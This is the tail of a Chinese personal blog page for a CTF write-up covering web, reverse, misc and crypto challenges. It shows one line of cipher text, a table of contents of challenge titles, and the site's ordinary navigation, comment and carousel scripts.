+<p>~呜嗷呜嗷嗷嗷啊嗷嗷~啊呜~啊~呜呜嗷~呜~呜呜啊嗷啊啊<del>嗷~啊啊~呜啊嗷~嗷~呜嗷啊嗷嗷~呜嗷嗷</del>呜~嗷啊嗷啊啊嗷嗷啊<del>嗷呜嗷呜嗷</del>嗷啊嗷~~嗷嗷啊~呜~啊~啊啊~啊~啊~呜呜嗷啊呜呜~啊呜呜呜呜嗷~啊啊啊</p>
+<span class="p cyan">有问题欢迎评论告诉我呀(✿◠‿◠)</span></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">不旦枕戈</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nrhs-space.github.io/2022/01/15/CTF-blue_space_wp/">https://nrhs-space.github.io/2022/01/15/CTF-blue_space_wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://nrhs-space.github.io" target="_blank">朝花夕拾</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E8%93%9D%E8%89%B2%E7%A9%BA%E9%97%B4/">蓝色空间</a></div><div class="post_share"><div class="social-share" data-image="https://s4.ax1x.com/2022/01/15/7GLgo9.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://npm.elemecdn.com/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://npm.elemecdn.com/social-share.js/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/21/CTF-encode/"><img class="prev-cover" src="https://s4.ax1x.com/2022/01/21/72Nr80.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">记录一次被迫参赛CTF</div></div></a></div><div class="next-post pull-right"><a href="/2021/12/25/Note-illness_count/"><img class="next-cover" src="https://s4.ax1x.com/2021/12/25/TUdiwV.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">医院统计与病案管理笔记</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/21/CTF-encode/" title="记录一次被迫参赛CTF"><img class="cover" src="https://s4.ax1x.com/2022/01/21/72Nr80.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-21</div><div class="title">记录一次被迫参赛CTF</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://z3.ax1x.com/2021/12/01/oGMLgU.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">不旦枕戈</div><div class="author-info__description">理想现实主义者</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="http://nrhs.eu.org/"><i class="fab fa-windows"></i><span>花的秘密世界</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-info card-announcement-animation"></i><span>Echo</span></div><div class="announcement_content">“我不想如此过完这一生，可是好像逃不过”</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">1.1.</span> <span class="toc-text">1. 签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AE%80%E5%8D%95%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.</span> <span class="toc-text">2. 简单爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-SQL%E6%88%96Web%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">3. SQL或Web扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-SQL2"><span class="toc-number">1.4.</span> <span class="toc-text">4. SQL2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%AE%80%E5%8D%95%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.5.</span> <span class="toc-text">5. 简单代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E7%8C%AB%E8%88%8D-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">6. (猫舍)SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E5%B0%9D%E8%AF%95%E6%89%BE%E5%88%B0%E4%BD%A0%E7%9A%84%E5%B0%8F%E5%A7%90%E5%A7%90%E5%90%A7%EF%BC%81"><span class="toc-number">1.7.</span> <span class="toc-text">7. 尝试找到你的小姐姐吧！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E7%AE%80%E5%8D%95%E7%9A%84Cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.</span> <span class="toc-text">8. 简单的Cookie注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-SQL%E6%B3%A8%E5%85%A5-%E9%9A%BE%E5%BA%A6%E6%8F%90%E5%8D%87"><span class="toc-number">1.9.</span> <span class="toc-text">9. SQL注入-难度提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E6%9C%80%E5%BC%BA%E5%A4%A7%E8%84%91"><span class="toc-number">1.10.</span> <span class="toc-text">10. 最强大脑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91"><span class="toc-number">2.1.</span> <span class="toc-text">1. 简单的逆向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%912"><span class="toc-number">2.2.</span> <span class="toc-text">2. 简单的逆向2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%B8%8D%E4%BC%9A%E5%90%A7%EF%BC%9F%E4%B8%8D%E4%BC%9A%E5%90%A7%EF%BC%9F%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E5%AE%83%EF%BC%9F"><span class="toc-number">3.1.</span> <span class="toc-text">1. 不会吧？不会吧？你不知道它？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%93%87%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%AD%A6%E5%BA%9F%E4%BA%86%E4%B8%80%E5%AE%9A%E7%94%A8%E5%BE%97%E5%88%B0%EF%BC%81"><span class="toc-number">3.2.</span> <span class="toc-text">2. 哇，这个学废了一定用得到！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%90%AC%E8%AF%B4%E8%BF%87Audacity%E5%90%97%EF%BC%9F"><span class="toc-number">3.3.</span> <span class="toc-text">3. 听说过Audacity吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Stegsolve-yyds%EF%BC%81"><span class="toc-number">3.4.</span> <span class="toc-text">4. Stegsolve yyds！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E4%BD%A0%E7%9F%A5%E9%81%93%E6%80%8E%E6%A0%B7%E7%A0%B4%E5%9D%8F%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%90%97%EF%BC%9F"><span class="toc-number">3.5.</span> <span class="toc-text">5. 你知道怎样破坏一个文件吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%93%A6-%E5%8E%9F%E6%9D%A5%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%9C%A8%E8%BF%99%E9%87%8C%E5%91%80"><span class="toc-number">3.6.</span> <span class="toc-text">6. 哦~原来二维码在这里呀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E5%8F%AF%E6%81%B6%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-number">3.7.</span> <span class="toc-text">7. 可恶的黑客</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AE%80%E5%8D%95%E7%9A%84RSA%E8%A7%A3%E5%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">1. 简单的RSA解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Manycode"><span class="toc-number">4.2.</span> <span class="toc-text">2. Manycode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-CuteCaesar"><span class="toc-number">4.3.</span> <span class="toc-text">3. CuteCaesar</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/30/Graduation/" title="亲爱的花"><img src="https://pic.imgdb.cn/item/64c8e3d51ddac507cc1a81df.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="亲爱的花"></a><div class="content"><a class="title" href="/2023/06/30/Graduation/" title="亲爱的花">亲爱的花</a><time datetime="2023-06-30T15:59:59.000Z" title="发表于 2023-06-30 23:59:59">2023-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/01/Always_with_me/" title="Always with me"><img src="https://pic.imgdb.cn/item/64ca3a1a1ddac507cc73853d.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Always with me"></a><div class="content"><a class="title" href="/2023/06/01/Always_with_me/" title="Always with me">Always with me</a><time datetime="2023-06-01T13:14:05.000Z" title="发表于 2023-06-01 21:14:05">2023-06-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/16/local_analyse/" title="基于GPS的坐标路径分析系统[待更新]"><img src="https://pic.imgdb.cn/item/63bd61cbbe43e0d30e088c6f.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于GPS的坐标路径分析系统[待更新]"></a><div class="content"><a class="title" href="/2022/12/16/local_analyse/" title="基于GPS的坐标路径分析系统[待更新]">基于GPS的坐标路径分析系统[待更新]</a><time datetime="2022-12-16T07:05:02.000Z" title="发表于 2022-12-16 15:05:02">2022-12-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/26/AI_piant/" title="NovelAI——AI绘图+QQ机器人"><img src="https://s1.ax1x.com/2022/11/27/zNjMhn.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NovelAI——AI绘图+QQ机器人"></a><div class="content"><a class="title" href="/2022/11/26/AI_piant/" title="NovelAI——AI绘图+QQ机器人">NovelAI——AI绘图+QQ机器人</a><time datetime="2022-11-26T10:18:47.000Z" title="发表于 2022-11-26 18:18:47">2022-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/12/BulletNote_open-source/" title="『弹幕笔记』开源！"><img src="https://s1.ax1x.com/2022/11/13/zFRVKJ.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="『弹幕笔记』开源！"></a><div class="content"><a class="title" href="/2022/11/12/BulletNote_open-source/" title="『弹幕笔记』开源！">『弹幕笔记』开源！</a><time datetime="2022-11-12T13:48:39.000Z" title="发表于 2022-11-12 21:48:39">2022-11-12</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2023 By 不旦枕戈</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">立于皓月之边，不弱星光之势</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://npm.elemecdn.com/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>(()=>{
+  const $countDom = document.getElementById('twikoo-count')
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://hua-twikoo.zeabur.app/',
+      region: ''
+    }, null))
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: 'https://hua-twikoo.zeabur.app/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      $countDom.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const loadTwikoo = (bool = false) => {
+    if (typeof twikoo === 'object') {
+      init()
+      bool && $countDom && setTimeout(getCount,0)
+    } else {
+      getScript('https://cdn.jsdelivr.net/gh/zhheo/twikoo@dev/dist/twikoo.all.min.js').then(()=> {
+        init()
+        bool && $countDom && setTimeout(getCount,0)
+      })
+    }
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo(true)
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/fireworks.min.js"></script><script async="" data-pjax="" src="https://npm.elemecdn.com/akilar-candyassets/js/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax="">
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2022/05/01/The truth_leave/" alt=""><img width="48" height="48" src="https://s1.ax1x.com/2022/05/05/Oeuf3Q.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-05-01</span><a class="blog-slider__title" href="2022/05/01/The truth_leave/" alt="">The truth that you leave</a><div class="blog-slider__text">原以为告别总会留有时间，相拥着泪别亦或者目送着渐行渐远。但后来才发现，告别大多都是悄无声息的。原来那次相见，就已经是最后一面。</div><a class="blog-slider__button" href="2022/05/01/The truth_leave/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2022/11/12/BulletNote_open-source/" alt=""><img width="48" height="48" src="https://s1.ax1x.com/2022/11/13/zFRVKJ.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-11-12</span><a class="blog-slider__title" href="2022/11/12/BulletNote_open-source/" alt="">『弹幕笔记』开源！</a><div class="blog-slider__text">我喜欢一些奇奇怪怪的东西，即使我不会以此谋生。但我喜欢有能力实现自己想法的自己。</div><a class="blog-slider__button" href="2022/11/12/BulletNote_open-source/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2021/12/05/Note-sql/" alt=""><img width="48" height="48" src="https://s4.ax1x.com/2021/12/06/or02FS.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-12-05</span><a class="blog-slider__title" href="2021/12/05/Note-sql/" alt="">SQL食用笔记</a><div class="blog-slider__text">此文档不包含SQL服务环境安装等软件问题，也不包括数据裤价格，质量，材质等奇怪问题。这里是一个为考试准备的知识整理！</div><a class="blog-slider__button" href="2021/12/05/Note-sql/" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer="" src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer="" data-pjax="" src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><script async="" src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>
